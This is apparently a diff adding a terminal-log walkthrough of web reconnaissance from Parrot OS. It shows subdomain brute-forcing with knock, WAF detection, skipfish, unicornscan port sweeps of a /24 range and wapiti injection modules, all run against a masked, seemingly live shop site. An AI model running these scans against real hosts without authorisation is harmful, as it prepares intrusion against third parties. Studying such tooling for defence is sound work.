+utils.ctSSL.errors.ctSSLFeatureNotAvailable - SSLv2 disabled.
+
+  * Session Resumption :
+      With Session IDs:           Not supported (0 successful, 5 failed, 0 errors, 5 total attempts).
+      With TLS Session Tickets:   Not Supported - TLS ticket assigned but not accepted.
+
+  * TLSV1_1 Cipher Suites :
+
+      Rejected Cipher Suite(s): Hidden 
+
+      Preferred Cipher Suite:          
+        ECDHE-RSA-AES256-SHA     256 bits      HTTP 404 Not Found                 
+
+      Accepted Cipher Suite(s):        
+        ECDHE-RSA-AES256-SHA     256 bits      HTTP 404 Not Found                 
+        CAMELLIA256-SHA          256 bits      HTTP 404 Not Found                 
+        AES256-SHA               256 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-AES128-SHA     128 bits      HTTP 404 Not Found                 
+        CAMELLIA128-SHA          128 bits      HTTP 404 Not Found                 
+        AES128-SHA               128 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-DES-CBC3-SHA   112 bits      HTTP 404 Not Found                 
+        DES-CBC3-SHA             112 bits      HTTP 404 Not Found                 
+
+      Unknown Errors: None             
+
+  * TLSV1_2 Cipher Suites :
+
+      Rejected Cipher Suite(s): Hidden 
+
+      Preferred Cipher Suite:          
+        ECDHE-RSA-AES256-GCM-SHA384256 bits      HTTP 404 Not Found                 
+
+      Accepted Cipher Suite(s):        
+        ECDHE-RSA-AES256-SHA384  256 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-AES256-SHA     256 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-AES256-GCM-SHA384256 bits      HTTP 404 Not Found                 
+        CAMELLIA256-SHA          256 bits      HTTP 404 Not Found                 
+        AES256-SHA256            256 bits      HTTP 404 Not Found                 
+        AES256-SHA               256 bits      HTTP 404 Not Found                 
+        AES256-GCM-SHA384        256 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-AES128-SHA256  128 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-AES128-SHA     128 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-AES128-GCM-SHA256128 bits      HTTP 404 Not Found                 
+        CAMELLIA128-SHA          128 bits      HTTP 404 Not Found                 
+        AES128-SHA256            128 bits      HTTP 404 Not Found                 
+        AES128-SHA               128 bits      HTTP 404 Not Found                 
+        AES128-GCM-SHA256        128 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-DES-CBC3-SHA   112 bits      HTTP 404 Not Found                 
+        DES-CBC3-SHA             112 bits      HTTP 404 Not Found                 
+
+      Unknown Errors: None             
+
+  * SSLV3 Cipher Suites :
+
+      Rejected Cipher Suite(s): Hidden 
+
+      Preferred Cipher Suite: None     
+
+      Accepted Cipher Suite(s): None   
+
+      Unknown Errors: None             
+
+  * TLSV1 Cipher Suites :
+
+      Rejected Cipher Suite(s): Hidden 
+
+      Preferred Cipher Suite:          
+        ECDHE-RSA-AES256-SHA     256 bits      HTTP 404 Not Found                 
+
+      Accepted Cipher Suite(s):        
+        ECDHE-RSA-AES256-SHA     256 bits      HTTP 404 Not Found                 
+        CAMELLIA256-SHA          256 bits      HTTP 404 Not Found                 
+        AES256-SHA               256 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-AES128-SHA     128 bits      HTTP 404 Not Found                 
+        CAMELLIA128-SHA          128 bits      HTTP 404 Not Found                 
+        AES128-SHA               128 bits      HTTP 404 Not Found                 
+        ECDHE-RSA-DES-CBC3-SHA   112 bits      HTTP 404 Not Found                 
+        DES-CBC3-SHA             112 bits      HTTP 404 Not Found                 
+
+      Unknown Errors: None             
+
+
+
+ SCAN COMPLETED IN 3.07 S
+ ------------------------
+
+Install knock
+
+┌─[root@parrot]─[~]
+└──╼ #wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/knock/knock-1.5.tar.gz
+--2016-05-29 12:19:30--  https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/knock/knock-1.5.tar.gz
+Resolving storage.googleapis.com (storage.googleapis.com)... 172.217.16.208, 2a00:1450:4001:801::2010
+Connecting to storage.googleapis.com (storage.googleapis.com)|172.217.16.208|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8484 (8.3K) [application/octet-stream]
+Saving to: ‘knock-1.5.tar.gz’
+
+knock-1.5.tar.gz    100%[=====================>]   8.29K  --.-KB/s   in 0.002s 
+
+2016-05-29 12:19:36 (4.03 MB/s) - ‘knock-1.5.tar.gz’ saved [8484/8484]
+
+┌─[root@parrot]─[~]
+└──╼ #ls
+Desktop    Downloads         Music     Public     Videos
+Documents  knock-1.5.tar.gz  Pictures  Templates
+
+┌─[root@parrot]─[~]
+└──╼ #tar -xvzf knock-1.5.tar.gz
+knock.py
+
+┌─[root@parrot]─[~]
+└──╼ #cp knock.py Desktop
+
+┌─[root@parrot]─[~]
+└──╼ #cd Desktop/
+
+┌─[root@parrot]─[~/Desktop]
+└──╼ #chmod +x knock.py 
+
+USE KNOCK
+
+$ python knock.py <option> <url>
+
+Rapid Scan
+
+Scanning with internal wordlist:
+$ python knock.py <url>
+
+Scanning with external wordlist:
+$ python knock.py <url> <wordlist>
+
+Options
+-zt Zone Transfer discovery:
+
+$ python knock.py -zt <url>
+-dns Dns resolver:
+
+$ python knock.py -dns <url>
+-wc Wildcard testing:
+
+$ python knock.py -wc <url>
+-wc Wildcard bypass:
+
+$ python knock.py -bw <stringexclude> <url>
+
+┌─[root@parrot]─[~/Desktop]
+└──╼ #./knock.py target!.com --wordlist /root/Desktop/rockyou.txt
+Knock v1.5 by Gianni 'guelfoweb' Amato ( http://knock.googlecode.com )
+
+[+] Testing domain
+    	www.target!.com          198.71.232.3      
+[+] Dns resolving
+       Domain name               Ip address              Name server       
+      target!.com             198.71.232.3      ip-198-71-232-3.ip.secureserver.net
+Found 1 host(s) for target!.com
+[+] Testing wildcard
+
+	Wildcard enabled! Try with -bw option
+	Example: knock -bw 404 target!.com
+
+┌─[root@parrot]─[~/Desktop]
+└──╼ #./knock.py -bw 404 target!.com
+Knock v1.5 by Gianni 'guelfoweb' Amato ( http://knock.googlecode.com )
+
+[+] Testing domain
+    	www.target!.com          198.71.232.3      
+[+] Dns resolving
+       Domain name               Ip address              Name server       
+      target!.com             198.71.232.3      ip-198-71-232-3.ip.secureserver.net
+Found 1 host(s) for target!.com
+[+] Bypass wildcard
+     0.target!.com                              
+     01.target!.com                             
+     02.target!.com                             
+     03.target!.com                             
+     1.target!.com                              
+
+--snip--
+
+Found 1904 subdomain(s) in 523.4 second(s)
+
+
+CHECK IF THE SITE IS BEHIND A FIREWALL
+
+┌─[root@parrot]─[~]
+└──╼ #wafw00f 198.71.232.3
+
+                                 ^     ^
+        _   __  _   ____ _   __  _    _   ____
+       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
+      | V V // o // _/ | V V // 0 // 0 // _/  
+      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/    
+                                <   
+                                 ...'
+                                 
+    WAFW00F - Web Application Firewall Detection Tool
+    
+    By Sandro Gauci && Wendel G. Henrique
+
+Checking http://198.71.232.3
+The site http://198.71.232.3 is behind a SecureIIS
+Number of requests: 9
+
+
+CHECK THE SITE WITH SKIPFISH
+
+┌─[root@parrot]─[~]
+└──╼ #skipfish -o /tmp/snep http://www.target!.com
+
+
+skipfish version 2.10b by lcamtuf@google.com 345 kB out (199.0 kB/s)  l
+skipfish version 2.10b by lcamtuf@google.com 352 kB out (201.2 kB/s)  l
+skipfish version 2.10b by lcamtuf@google.com 358 kB out (206.1 kB/s)  l
+skipfish version 2.10b by lcamtuf@google.com 369 kB out (214.7 kB/s)  l
+  - www.target!.com -30.831s), 6349 kB in, 378 kB out (221.3 kB/s)  l
+  - www.target!.com -31.125s), 6612 kB in, 386 kB out (227.0 kB/s)  l
+Scan statistics:: 0:00:31.635s), 6796 kB in, 391 kB out (230.9 kB/s)  l
+Scan statistics:: 0:00:31.920s), 7064 kB in, 398 kB out (235.9 kB/s)  l
+      Scan time : 0:00:32.170s), 7236 kB in, 403 kB out (239.4 kB/s)  l
+      Scan time : 0:00:32.334s), 7389 kB in, 407 kB out (242.4 kB/s)  l
+  HTTP requests : 1728 (53.4/s), 7460 kB in, 408 kB out (243.3 kB/s)  l
+    Compression : 5611 kB in, 26863 kB out (65.4% gain)    0 drops0 val
+    HTTP faults : 1 net errors, 0 proto errors, 1 retried, 0 drops0 val
+ TCP handshakes : 19 total (90.9 req/conn)  purgeddict     1 par, 0 val
+     TCP faults : 0 failures, 0 timeouts, 8 purgeddict     1 par, 0 val
+ External links : 5456 skipped done (91.30%)    0 dict     1 par, 0 val
+   Reqs pending : 0         21 done (91.30%)    0 dict     1 par, 0 val
+Database statistics: total, 21 done (91.30%)    0 dict     1 par, 0 val
+Database statistics: total, 21 done (91.30%)    0 dict     1 par, 0 val
+         Pivots : 23 total, 21 done (91.30%)    0 dict     1 par, 0 val
+         Pivots : 23 total, 22 done (95.65%)    0 dict     1 par, 0 val
+    In progress : 0 pending, 0 init, 1 attacks, 0 dict     1 par, 0 val
+  Missing nodes : 0 spotted dir, 20 file, 0 pinfo, 0 unkn, 1 par, 0 val
+     Node types : 1 serv, 1 dir, 20 file, 0 pinfo, 0 unkn, 1 par, 0 val
+   Issues found : 6 info, 1 warn, 102 low, 39 medium, 0 high impact
+      Dict size : 17 words (17 new), 2 extensions, 256 candidates
+     Signatures : 77 total
+        
+[+] Copying static resources...
+[+] Sorting and annotating crawl nodes: 23
+[+] Looking for duplicate entries: 23
+[+] Counting unique nodes: 14
+[+] Saving pivot data for third-party tools...
+[+] Writing scan description...
+[+] Writing crawl tree: 23
+[+] Generating summary views...
+[+] Report saved to '/tmp/snep/index.html' [0xed916f54].
+[+] This was a great day for science!
+
+┌─[root@parrot]─[~]
+└──╼ #firefox /tmp/snep/index.html
+
+CHECK THE SITE WITH UNICORNSCAN
+
+┌─[root@parrot]─[~]
+└──╼ #unicornscan -r200 -Iv -eosdetect  -mT 198.71.232.3:3306,80,443
+
+adding 198.71.232.3/32 mode `TCPscan' ports `3306,80,443' pps 200
+using interface(s) eth0
+scaning 1.00e+00 total hosts with 3.00e+00 total packets, should take a little longer than 7 Seconds
+sender statistics 199.2 pps with 3 packets sent total
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:80  ttl 47
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:443  ttl 47
+listener statistics 72 packets recieved 0 packets droped and 0 interface drops
+TCP open	            http[   80]		from 198.71.232.3  ttl 47 OS `' 
+TCP open	           https[  443]		from 198.71.232.3  ttl 47 OS `' 
+
+UDP Scan
+
+┌─[root@parrot]─[~]
+└──╼ #unicornscan -mU -r200 -I  198.71.232.3
+
+
+Where
+
+__________________________________________________________________
+ -mU              :    is mode UDP 
+ -I               :    Display Immediately
+ 198.71.232.3	  :    target IP  
+  :53             :    port number 
+ -r200            :    200 Packets per second 
+___________________________________________________________________
+
+TCP Scan
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #unicornscan -r500 -mT 198.71.232.1/24:80,443,445,339
+
+
+Where
+
+__________________________________________________________________
+ -mT                 :    is mode TCP 
+ 198.71.232.3/24     :    target network range ( block )   
+  :80,443,445,339    :    ports 
+ -r500               :    500 Packets per second 
+___________________________________________________________________
+
+Many Other options you can pass , for example for ACK use -mTsA
+
+SYN                     :    -mT
+ACK scan                :    -mTsA
+Fin scan                :    -mTsF
+Null scan               :    -mTs
+Xmas scan               :    -mTsFPU
+Connect Scan            :    -msf -Iv
+scan with all options   :    -mTFSRPAUEC
+Syn + osdetect          :    -eosdetect -Iv (-mT)
+scan ports 1 through 5  :   (-mT) host:1-5
+
+Practical Use Case
+
+scanning for mysql with http and https ports
+
+┌─[root@parrot]─[~]
+└──╼ #unicornscan -r200 -Iv -eosdetect -mT target!.com:3306,80,443
+adding 198.71.232.3/32 mode `TCPscan' ports `3306,80,443' pps 200
+using interface(s) eth0
+scaning 1.00e+00 total hosts with 3.00e+00 total packets, should take a little longer than 7 Seconds
+sender statistics 194.9 pps with 3 packets sent total
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:80  ttl 47
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:443  ttl 47
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 4372 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 9414 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 3254 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 4372 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 4094 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+listener statistics 193 packets recieved 0 packets droped and 0 interface drops
+TCP open	            http[   80]		from 198.71.232.3  ttl 47 OS `' 
+TCP open	           https[  443]		from 198.71.232.3  ttl 47 OS `' 
+
+┌─[root@parrot]─[~]
+└──╼ #unicornscan -eosdetect -Iv -v target!.com
+adding 198.71.232.3/32 mode `TCPscan' ports `7,9,11,13,18,19,21-23,25,37,39,42,49,50,53,65,67-70,79-81,88,98,100,105-107,109-111,113,118,119,123,129,135,137-139,143,150,161-164,174,177-179,191,199-202,204,206,209,210,213,220,345,346,347,369-372,389,406,407,422,443-445,487,500,512-514,517,518,520,525,533,538,548,554,563,587,610-612,631-634,636,642,653,655,657,666,706,750-752,765,779,808,873,901,923,941,946,992-995,1001,1023-1030,1080,1210,1214,1234,1241,1334,1349,1352,1423-1425,1433,1434,1524,1525,1645,1646,1649,1701,1718,1719,1720,1723,1755,1812,1813,2048-2050,2101-2104,2140,2150,2233,2323,2345,2401,2430,2431,2432,2433,2583,2628,2776,2777,2988,2989,3050,3130,3150,3232,3306,3389,3456,3493,3542-3545,3632,3690,3801,4000,4400,4321,4567,4899,5002,5136-5139,5150,5151,5222,5269,5308,5354,5355,5422-5425,5432,5503,5555,5556,5678,6000-6007,6346,6347,6543,6544,6789,6838,6666-6670,7000-7009,7028,7100,7983,8079-8082,8088,8787,8879,9090,9101-9103,9325,9359,10000,10026,10027,10067,10080,10081,10167,10498,11201,15345,17001-17003,18753,20011,20012,21554,22273,26274,27374,27444,27573,31335-31338,31787,31789,31790,31791,32668,32767-32780,33390,47262,49301,54320,54321,57341,58008,58009,58666,59211,60000,60006,61000,61348,61466,61603,63485,63808,63809,64429,65000,65506,65530-65535' pps 300
+using interface(s) eth0
+added module payload for port 1900 proto 17
+added module payload for port 80 proto 6
+added module payload for port 5060 proto 17
+added module payload for port 53 proto 17
+added module payload for port 80 proto 6
+added module payload for port 518 proto 17
+scaning 1.00e+00 total hosts with 3.38e+02 total packets, should take a little longer than 8 Seconds
+drone type Unknown on fd 4 is version 1.1
+drone type Unknown on fd 5 is version 1.1
+added module payload for port 1900 proto 17
+added module payload for port 80 proto 6
+added module payload for port 5060 proto 17
+added module payload for port 53 proto 17
+added module payload for port 80 proto 6
+added module payload for port 518 proto 17
+scan iteration 1 out of 1
+using pcap filter: `dst 192.168.1.83 and ! src 192.168.1.83 and (tcp)'
+using TSC delay
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:80  ttl 47
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:443  ttl 47
+sender statistics 290.1 pps with 338 packets sent total
+listener statistics 166 packets recieved 0 packets droped and 0 interface drops
+TCP open	            http[   80]		from 198.71.232.3  ttl 47 OS `' 
+TCP open	           https[  443]		from 198.71.232.3  ttl 47 OS `' 
+
+
+┌─[root@parrot]─[~]
+└──╼ #unicornscan -r200 -Iv -eosdetect  -mT target!.com:3306,80,443
+adding 198.71.232.3/32 mode `TCPscan' ports `3306,80,443' pps 200
+using interface(s) eth0
+scaning 1.00e+00 total hosts with 3.00e+00 total packets, should take a little longer than 7 Seconds
+sender statistics 138.1 pps with 3 packets sent total
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:80  ttl 47
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:443  ttl 47
+listener statistics 142 packets recieved 0 packets droped and 0 interface drops
+TCP open	            http[   80]		from 198.71.232.3  ttl 47 OS `' 
+TCP open	           https[  443]		from 198.71.232.3  ttl 47 OS `' 
+
+┌─[root@parrot]─[~]
+└──╼ #unicornscan -r200 -Iv -eosdetect  -mT 198.71.232.3:3306,80,443
+adding 198.71.232.3/32 mode `TCPscan' ports `3306,80,443' pps 200
+using interface(s) eth0
+scaning 1.00e+00 total hosts with 3.00e+00 total packets, should take a little longer than 7 Seconds
+sender statistics 199.3 pps with 3 packets sent total
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:80  ttl 47
+ST 1 IP TTL 47 TOS 0x00 [DF] TCP WS 14480 urg_ptr 0000
+TCP open 198.71.232.3:443  ttl 47
+listener statistics 146 packets recieved 0 packets droped and 0 interface drops
+TCP open	            http[   80]		from 198.71.232.3  ttl 47 OS `' 
+TCP open	           https[  443]		from 198.71.232.3  ttl 47 OS `' 
+
+
+┌─[root@parrot]─[~]
+└──╼ #unicornscan -msf -v -I 198.71.232.3/24 
+adding 198.71.232.0/24 mode `TCPscan' ports `7,9,11,13,18,19,21-23,25,37,39,42,49,50,53,65,67-70,79-81,88,98,100,105-107,109-111,113,118,119,123,129,135,137-139,143,150,161-164,174,177-179,191,199-202,204,206,209,210,213,220,345,346,347,369-372,389,406,407,422,443-445,487,500,512-514,517,518,520,525,533,538,548,554,563,587,610-612,631-634,636,642,653,655,657,666,706,750-752,765,779,808,873,901,923,941,946,992-995,1001,1023-1030,1080,1210,1214,1234,1241,1334,1349,1352,1423-1425,1433,1434,1524,1525,1645,1646,1649,1701,1718,1719,1720,1723,1755,1812,1813,2048-2050,2101-2104,2140,2150,2233,2323,2345,2401,2430,2431,2432,2433,2583,2628,2776,2777,2988,2989,3050,3130,3150,3232,3306,3389,3456,3493,3542-3545,3632,3690,3801,4000,4400,4321,4567,4899,5002,5136-5139,5150,5151,5222,5269,5308,5354,5355,5422-5425,5432,5503,5555,5556,5678,6000-6007,6346,6347,6543,6544,6789,6838,6666-6670,7000-7009,7028,7100,7983,8079-8082,8088,8787,8879,9090,9101-9103,9325,9359,10000,10026,10027,10067,10080,10081,10167,10498,11201,15345,17001-17003,18753,20011,20012,21554,22273,26274,27374,27444,27573,31335-31338,31787,31789,31790,31791,32668,32767-32780,33390,47262,49301,54320,54321,57341,58008,58009,58666,59211,60000,60006,61000,61348,61466,61603,63485,63808,63809,64429,65000,65506,65530-65535' pps 300
+using interface(s) eth0
+scaning 2.56e+02 total hosts with 8.65e+04 total packets, should take a little longer than 4 Minutes, 55 Seconds
+connected 192.168.1.83:39367 -> 198.71.232.3:443
+TCP open 198.71.232.3:443  ttl 47
+connected 192.168.1.83:31012 -> 198.71.232.5:443
+TCP open 198.71.232.5:443  ttl 110
+connected 192.168.1.83:7126 -> 198.71.232.4:443
+TCP open 198.71.232.4:443  ttl 47
+connected 192.168.1.83:32420 -> 198.71.232.7:443
+TCP open 198.71.232.7:443  ttl 47
+connected 192.168.1.83:6417 -> 198.71.232.6:443
+TCP open 198.71.232.6:443  ttl 47
+connected 192.168.1.83:64190 -> 198.71.232.4:80
+TCP open 198.71.232.4:80  ttl 47
+connected 192.168.1.83:36816 -> 198.71.232.6:80
+TCP open 198.71.232.6:80  ttl 47
+connected 192.168.1.83:56533 -> 198.71.232.7:80
+TCP open 198.71.232.7:80  ttl 47
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 1722 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2932 and we have 1550
+Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 5435 and we have 1550
+connected 192.168.1.83:5563 -> 198.71.232.7:22
+TCP open 198.71.232.7:22  ttl 47
+connected 192.168.1.83:7734 -> 198.71.232.1:25
+TCP open 198.71.232.1:25  ttl 47
+connected 192.168.1.83:43683 -> 198.71.232.0:25
+TCP open 198.71.232.0:25  ttl 47
+connected 192.168.1.83:30502 -> 198.71.232.2:25
+TCP open 198.71.232.2:25  ttl 47
+sender statistics 290.9 pps with 86528 packets sent total
+listener statistics 180 packets recieved 0 packets droped and 0 interface drops
+TCP open	            smtp[   25]		from 198.71.232.0  ttl 47 
+TCP open	            smtp[   25]		from 198.71.232.1  ttl 47 
+TCP open	            smtp[   25]		from 198.71.232.2  ttl 47 
+TCP open	           https[  443]		from 198.71.232.3  ttl 47 
+TCP open	            http[   80]		from 198.71.232.4  ttl 47 
+TCP open	           https[  443]		from 198.71.232.4  ttl 47 
+TCP open	           https[  443]		from 198.71.232.5  ttl 110 
+TCP open	            http[   80]		from 198.71.232.6  ttl 47 
+TCP open	           https[  443]		from 198.71.232.6  ttl 47 
+TCP open	             ssh[   22]		from 198.71.232.7  ttl 47 
+TCP open	            http[   80]		from 198.71.232.7  ttl 47 
+TCP open	           https[  443]		from 198.71.232.7  ttl 47 
+
+
+┌─[✗]─[root@parrot]─[~]
+└──╼ #unicornscan -mU -v -I 198.71.232.3/24
+adding 198.71.232.0/24 mode `UDPscan' ports `7,9,11,13,17,19,20,37,39,42,49,52-54,65-71,81,111,161,123,136-170,514-518,630,631,636-640,650,653,921,1023-1030,1900,2048-2050,27900,27960,32767-32780,32831' pps 300
+using interface(s) eth0
+scaning 2.56e+02 total hosts with 2.66e+04 total packets, should take a little longer than 1 Minutes, 35 Seconds
+UDP open 192.168.1.1:53  ttl 64
+
+--snip--
+
+CHECK THE SITE WITH WAPITI
+
+┌─[root@parrot]─[~]
+└──╼ #wapiti http://www.target!.com/ -n 10 -b folder -u -v 1 -f html -o /tmp/scan_report
+Wapiti-2.3.0 (wapiti.sourceforge.net)
+
+[*] Loading modules:
+	 mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto
+
+[+] Launching module exec
++ attackGET http://www.target!.com/
++ attackGET http://www.target!.com/site.css?v=
++ attackGET http://www.target!.com/common/wsb/core
++ attackGET http://www.target!.com/libs/knockout/knockout
++ attackGET http://www.target!.com/home.html
++ attackGET http://www.target!.com/contact.html
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/navigation/subNavigation
++ attackGET http://www.target!.com/products.html
++ attackGET http://www.target!.com/bullet-jewellery.html
++ attackGET http://www.target!.com/boar-tusk-necklaces.html
++ attackGET http://www.target!.com/decorated-skulls-.html
++ attackGET http://www.target!.com/bone-art.html
++ attackGET http://www.target!.com/leather-crafting.html
++ attackGET http://www.target!.com/wooden-items.html
++ attackGET http://www.target!.com/random-items.html
++ attackGET http://www.target!.com/WSB.ForceDesktop
++ attackGET http://www.target!.com/common/cookiemanager/cookiemanager
++ attackGET http://www.target!.com/designer/iebackground/iebackground
++ attackGET http://www.target!.com/.view-as-mobile
++ attackGET http://www.target!.com/.wsb-canvas-page-container
++ attackGET http://www.target!.com/target!.com
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/customform/customForm.published
++ attackGET http://www.target!.com/designer/app/builder/ui/controls/media/gallery/media.gallery
++ attackGET http://www.target!.com/Loading...
++ attackGET http://www.target!.com/designer/social/twitter/social.twitter
++ attackGET http://www.target!.com/plugins/twitter/index.php
++ attackGET http://www.target!.com/designer/util/facebookSDKHelper
+
+[+] Launching module file
++ attackGET http://www.target!.com/
++ attackGET http://www.target!.com/site.css?v=
++ attackGET http://www.target!.com/common/wsb/core
++ attackGET http://www.target!.com/libs/knockout/knockout
++ attackGET http://www.target!.com/home.html
++ attackGET http://www.target!.com/contact.html
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/navigation/subNavigation
++ attackGET http://www.target!.com/products.html
++ attackGET http://www.target!.com/bullet-jewellery.html
++ attackGET http://www.target!.com/boar-tusk-necklaces.html
++ attackGET http://www.target!.com/decorated-skulls-.html
++ attackGET http://www.target!.com/bone-art.html
++ attackGET http://www.target!.com/leather-crafting.html
++ attackGET http://www.target!.com/wooden-items.html
++ attackGET http://www.target!.com/random-items.html
++ attackGET http://www.target!.com/WSB.ForceDesktop
++ attackGET http://www.target!.com/common/cookiemanager/cookiemanager
++ attackGET http://www.target!.com/designer/iebackground/iebackground
++ attackGET http://www.target!.com/.view-as-mobile
++ attackGET http://www.target!.com/.wsb-canvas-page-container
++ attackGET http://www.target!.com/target!.com
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/customform/customForm.published
++ attackGET http://www.target!.com/designer/app/builder/ui/controls/media/gallery/media.gallery
++ attackGET http://www.target!.com/Loading...
++ attackGET http://www.target!.com/designer/social/twitter/social.twitter
++ attackGET http://www.target!.com/plugins/twitter/index.php
++ attackGET http://www.target!.com/designer/util/facebookSDKHelper
+
+[+] Launching module sql
++ attackGET http://www.target!.com/
++ attackGET http://www.target!.com/site.css?v=
++ attackGET http://www.target!.com/common/wsb/core
++ attackGET http://www.target!.com/libs/knockout/knockout
++ attackGET http://www.target!.com/home.html
++ attackGET http://www.target!.com/contact.html
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/navigation/subNavigation
++ attackGET http://www.target!.com/products.html
++ attackGET http://www.target!.com/bullet-jewellery.html
++ attackGET http://www.target!.com/boar-tusk-necklaces.html
++ attackGET http://www.target!.com/decorated-skulls-.html
++ attackGET http://www.target!.com/bone-art.html
++ attackGET http://www.target!.com/leather-crafting.html
++ attackGET http://www.target!.com/wooden-items.html
++ attackGET http://www.target!.com/random-items.html
++ attackGET http://www.target!.com/WSB.ForceDesktop
++ attackGET http://www.target!.com/common/cookiemanager/cookiemanager
++ attackGET http://www.target!.com/designer/iebackground/iebackground
++ attackGET http://www.target!.com/.view-as-mobile
++ attackGET http://www.target!.com/.wsb-canvas-page-container
++ attackGET http://www.target!.com/target!.com
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/customform/customForm.published
++ attackGET http://www.target!.com/designer/app/builder/ui/controls/media/gallery/media.gallery
++ attackGET http://www.target!.com/Loading...
++ attackGET http://www.target!.com/designer/social/twitter/social.twitter
++ attackGET http://www.target!.com/plugins/twitter/index.php
++ attackGET http://www.target!.com/designer/util/facebookSDKHelper
+
+[+] Launching module xss
++ attackGET http://www.target!.com/
++ attackGET http://www.target!.com/site.css?v=
++ attackGET http://www.target!.com/common/wsb/core
++ attackGET http://www.target!.com/libs/knockout/knockout
++ attackGET http://www.target!.com/home.html
++ attackGET http://www.target!.com/contact.html
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/navigation/subNavigation
++ attackGET http://www.target!.com/products.html
++ attackGET http://www.target!.com/bullet-jewellery.html
++ attackGET http://www.target!.com/boar-tusk-necklaces.html
++ attackGET http://www.target!.com/decorated-skulls-.html
++ attackGET http://www.target!.com/bone-art.html
++ attackGET http://www.target!.com/leather-crafting.html
++ attackGET http://www.target!.com/wooden-items.html
++ attackGET http://www.target!.com/random-items.html
++ attackGET http://www.target!.com/WSB.ForceDesktop
++ attackGET http://www.target!.com/common/cookiemanager/cookiemanager
++ attackGET http://www.target!.com/designer/iebackground/iebackground
++ attackGET http://www.target!.com/.view-as-mobile
++ attackGET http://www.target!.com/.wsb-canvas-page-container
++ attackGET http://www.target!.com/target!.com
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/customform/customForm.published
++ attackGET http://www.target!.com/designer/app/builder/ui/controls/media/gallery/media.gallery
++ attackGET http://www.target!.com/Loading...
++ attackGET http://www.target!.com/designer/social/twitter/social.twitter
++ attackGET http://www.target!.com/plugins/twitter/index.php
++ attackGET http://www.target!.com/designer/util/facebookSDKHelper
+
+[+] Launching module blindsql
++ attackGET http://www.target!.com/
++ attackGET http://www.target!.com/site.css?v=
++ attackGET http://www.target!.com/common/wsb/core
++ attackGET http://www.target!.com/libs/knockout/knockout
++ attackGET http://www.target!.com/home.html
++ attackGET http://www.target!.com/contact.html
++ attackGET http://www.target!.com/designer/app/builder/ui/canvas/elements/navigation/subNavigation
++ attackGET http://www.target!.com/products.html
++ attackGET http://www.target!.com/bullet-jewellery.html
++ attackGET http://www.target!.com/boar-tusk-necklaces.html
++ attackGET http://www.target!.com/decorated-skulls-.html
++ attackGET http://www.target!.com/bone-art.html
